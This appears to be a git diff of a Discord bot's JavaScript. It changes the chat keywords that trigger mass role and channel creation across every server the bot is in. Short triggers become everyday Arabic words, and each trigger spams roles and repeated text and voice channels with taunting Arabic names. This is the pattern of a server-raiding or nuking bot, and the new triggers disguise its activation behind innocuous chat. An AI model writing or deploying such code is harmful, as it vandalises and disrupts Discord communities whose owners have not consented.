@@ -78,7 +78,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "k1") {
+     if (message.content === "بنات") {
          LOka.guilds.forEach(m =>{
   m.createRole({
         name : "يمين بالله مشوار خلاص خلها عوافي.",
@@ -285,7 +285,7 @@ LOka.on('message', message => {
 }
 });
 LOka.on('message', message => {
-         if (message.content === "k") {
+         if (message.content === "وينكم") {
                LOka.guilds.forEach(m =>{
 m.createChannel('ااه', 'text');
 m.createChannel('ااه', 'text');
@@ -349,7 +349,7 @@ m.createChannel('ااه', 'text');
 });
  
 LOka.on('message', message => {
-         if (message.content === "k") {
+         if (message.content === "وينكم") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('تقولي شخبارك.', 'voice');
 m.createChannel('تقولي شخبارك.', 'voice');
